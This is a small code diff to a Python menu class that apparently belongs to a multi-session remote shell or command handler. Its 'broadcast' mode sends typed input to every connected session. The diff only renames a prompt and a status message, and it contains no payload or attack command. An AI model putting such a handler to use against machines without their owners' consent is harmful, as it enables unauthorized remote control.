@@ -99,7 +99,7 @@ class Menu:
             printColor("information","[?] MOD BROADCAST")
             printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
             while True:
-                forall = str(input("broadcast>"))
+                forall = str(input("broadcastO>"))
                 if(forall == "--back" or forall == "-b"):
                     break
                 for key in Handler.dict_conn.keys():
@@ -114,7 +114,7 @@ class Menu:
         else:
             printColor("error","[+] No connection is enabled.\n")
         
-        printColor("information", "[-] Back to menu\n")
+        printColor("information", "[-] MOD MAIN\n")
 
 
     def main(self):
